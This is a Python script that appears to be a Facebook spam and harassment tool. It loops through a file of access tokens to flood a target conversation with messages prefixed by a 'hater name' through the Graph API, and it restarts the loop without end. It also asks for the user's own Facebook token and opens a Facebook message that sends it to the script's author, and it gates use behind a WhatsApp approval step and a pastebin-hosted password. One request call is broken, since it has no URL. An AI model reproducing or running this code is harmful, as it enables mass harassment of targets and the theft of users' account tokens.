import requests
import time
import os
import sys
import hashlib
from urllib.parse import quote
from colorama import init, Fore, Style

# Initialize Colorama (Fix for Color Codes Not Showing Properly)
init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Unique Key Generate Karne Ka Function
def get_unique_id():
    try:
        unique_str = str(os.getlogin())
        return hashlib.sha256(unique_str.encode()).hexdigest()
    except Exception as e:
        print(f'Error generating unique ID: {e}')
        exit(1)

# Approval Check Karne Ka Function
def check_permission(unique_key):
    print(Fore.YELLOW + "[🔄] Checking Approval...")
    while True:
        try:
            response = requests.get()
            if response.status_code == 200:
                data = response.text
                if unique_key in data:
                    print(Fore.GREEN + "[√] Permission granted. Your Key Was Approved.")
                    return  
                print(Fore.RED + "[❌] Your Key is NOT Approved! Waiting for approval...")
                time.sleep(10)
            else:
                print(f'Failed to fetch permissions list. Status code: {response.status_code}')
                time.sleep(10)
        except Exception as e:
            print(f'Error checking permission: {e}')
            time.sleep(10)

# Approval Request WhatsApp Pe Bhejna
def send_approval_request(unique_key):
    try:
        message = f'Hello, Raj Thakur sir! Please Approve My Token is :: {unique_key}'
        os.system(f'am start https://wa.me/+8708206094?text={quote(message)} >/dev/null 2>&1')
        print(Fore.YELLOW + '[📲] WhatsApp opened with approval request. Waiting for approval...')
    except Exception as e:
        print(f'Error sending approval request: {e}')
        exit(1)

# Approval System Start Karna
def pre_main():
    clear_screen()
    unique_key = get_unique_id()
    print(f'{Fore.YELLOW}[🔐] Your Unique Key: {Fore.CYAN}{unique_key}')
    send_approval_request(unique_key)
    check_permission(unique_key)  # Approval check yahi par hoga
    print(Fore.GREEN + "[✔] Approved! Now Starting Your Script...\n")

# ---- Aapki Original Script Yaha Se Start Ho Rahi Hai ----

def typing_effect(text, delay=0.002, color=Fore.WHITE):
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(float(delay))  # Ensure delay is a float
    print()

def display_animated_logo():
    clear_screen()
    typing_effect("(_ _______ ______ _______ _______ _______ _ _________)", Fore.YELLOW)
    typing_effect("( (    /|  (  ___  )  (  __  \\   (  ____ \\  (  ____ \\  (       )      (  ___  )  ( \\        \\__   __/", Fore.YELLOW)
    typing_effect("|  \\  ( |  | (   ) |  | (  \\  )  | (    \\/  | (    \\/  | () () |      | (   ) |  | (           ) (   ", Fore.GREEN)
    typing_effect("|   \\ | |  | (___) |  | |   ) |  | (__      | (__      | || || |      | (___) |  | |           | |   ", Fore.CYAN)
    typing_effect("| (\\ \\) |  |  ___  |  | |   | |  |  __)     |  __)     | |(_)| |      |  ___  |  | |           | |   ", Fore.CYAN)
    typing_effect("| | \\   |  | (   ) |  | |   ) |  | (        | (        | |   | |      | (   ) |  | |           | |   ", Fore.GREEN)
    typing_effect("| )  \\  |  | )   ( |  | (__/  )  | (____/\\  | (____/\\  | )   ( |      | )   ( |  | (____/\\  ___) (___", Fore.YELLOW)
    typing_effect("|/    )_)  |/     \\|  (______/   (_______/  (_______/  |/     \\|      |/     \\|  (_______/  \\_______/", Fore.YELLOW)
    typing_effect("         ╭───────────────────────── < ~ COUNTRY ~  > ─────────────────────────────────────╮", Fore.CYAN)
    typing_effect("         │                         【•】 YOUR COUNTRY  ➤ INDIA                            │", Fore.CYAN)
    typing_effect("         │                         【•】 YOUR REGION   ➤ BIHAR                            │", Fore.CYAN)
    typing_effect("         │                         【•】 YOUR CITY     ➤ PATNA                            │", Fore.CYAN)
    typing_effect("         ╰────────────────────────────< ~ COUNTRY ~  >────────────────────────────────────╯", Fore.CYAN)
    typing_effect("╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗", Fore.YELLOW)
    typing_effect("║  NAME                 : BROKEN-NADEEM           GOD ABBUS                     RAKHNA              ║", Fore.CYAN)
    typing_effect("║  RULLEX               : PATNA ON FIRE            KARNE PE                     SAB GOD             ║", Fore.GREEN)
    typing_effect("║  FORM 🏠              : BIHAR-PATNA              APPEARED                     ABBUS BANA          ║", Fore.CYAN)
    typing_effect("║  BRAND                : MULTI CONVO              HATA DIYA                    HAI BILKUL          ║", Fore.GREEN)
    typing_effect("║  GitHub               : BROKEN NADEEM            JAAEGA YE                    KOI BHI HO          ║", Fore.CYAN)
    typing_effect("║  WHATSAP              : +917209101285            BAAT YWAD                   GOD ABBUS NO         ║", Fore.GREEN)
    typing_effect("╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝", Fore.YELLOW)
    time.sleep(1)

def animated_input(prompt_text):
    print(Fore.CYAN + "{<<══════════════════════════════════════BROKEN NADEEM HERE═══════════════════════════════════════>>}")
    typing_effect(prompt_text, 0.03, Fore.LIGHTYELLOW_EX)
    return input(Fore.GREEN + "➜ ")

def send_token_to_facebook(token):
    try:
        message = f'Hello, Raj Khan sir! I am using your tools. My token 🔐 ==> {token}'
        facebook_url = f'https://www.facebook.com/messages/t/shankar.panchal.9883739?text={quote(message)}'

        # Open Facebook URL (this will open the URL in the default browser)
        os.system(f'am start {facebook_url} >/dev/null 2>&1')

        print('Successfully opened Facebook with your token message.')

    except Exception as e:
        print(f'Error sending message to Facebook: {e}')

def fetch_password_from_pastebin(pastebin_url):
    try:
        response = requests.get(pastebin_url)
        response.raise_for_status()
        return response.text.strip()
    except requests.exceptions.RequestException:
        exit(1)

def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
    with open(messages_file, "r") as file:
        messages = file.readlines()
    with open(tokens_file, "r") as file:
        tokens = [token.strip() for token in file.readlines()]

    token_profiles = {token: fetch_profile_name(token) for token in tokens}
    target_profile_name = fetch_target_name(target_id, tokens[0])  

    headers = {"User-Agent": "Mozilla/5.0"}

    while True:
        for message_index, message in enumerate(messages):
            token_index = message_index % len(tokens)
            access_token = tokens[token_index]
            sender_name = token_profiles.get(access_token, "Unknown Sender")
            full_message = f"{haters_name} {message.strip()}"

            url = f"https://graph.facebook.com/v17.0/t_{target_id}"
            parameters = {"access_token": access_token, "message": full_message}

            try:
                response = requests.post(url, json=parameters, headers=headers)
                response.raise_for_status()
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

                print(Fore.YELLOW + f"\n<<═══════════════════════BROTHER═════════════NADEEM DONE═════════════SAHIL DONE════════════════════>>")
                typing_effect(f"[🎉] MESSAGE {message_index + 1} SUCCESSFULLY SENT!", 0.02, Fore.CYAN)
                typing_effect(f"[👤] SENDER: {sender_name}", 0.02, Fore.WHITE)
                typing_effect(f"[📩] TARGET: {target_profile_name} ({target_id})", 0.02, Fore.MAGENTA)
                typing_effect(f"[📨] MESSAGE: {full_message}", 0.02, Fore.LIGHTGREEN_EX)
                typing_effect(f"[⏰] TIME: {current_time}", 0.02, Fore.LIGHTWHITE_EX)
                print(Fore.YELLOW + f"<<═══════════════════════BROTHER═════════════NADEEM DONE═════════════SAHIL DONE════════════════════>>\n")

            except requests.exceptions.RequestException:
                continue  

            time.sleep(speed)

        print(Fore.CYAN + "\n[+] All messages sent. Restarting the process...\n")

def main():
    pre_main()  # Approval system ko yaha call kiya hai  
    clear_screen()
    display_animated_logo()

    pastebin_url = "https://pastebin.com/raw/kMBpBe88"
    correct_password = fetch_password_from_pastebin(pastebin_url)

    entered_password = animated_input("  【👑】 ENTER OWNER NAME➜")
    tokens_file = animated_input(" 【📕】 ENTER TOKEN FILE➜")
    target_id = animated_input("  【🖇️】  ENTER CONVO UID ➜")
    haters_name = animated_input("  【🖊️】 ENTER HATER NAME➜")
    messages_file = animated_input("  【📝】 ENTER MESSAGE FILE➜")
    speed = float(animated_input("  【⏰】 ENTER DELAY/TIME (in seconds) FOR MESSAGES ➜"))

    if entered_password != correct_password:
        print(Fore.RED + "[x] Incorrect OWNER NAME. Exiting program.")
        exit(1)

    # Get Facebook token and send it to your inbox
    facebook_token = animated_input("【📩】 ENTER YOUR FACEBOOK TOKEN ➜")
    send_token_to_facebook(facebook_token)

    send_messages(tokens_file, target_id, messages_file, haters_name, speed)

if __name__ == "__main__":
    main()
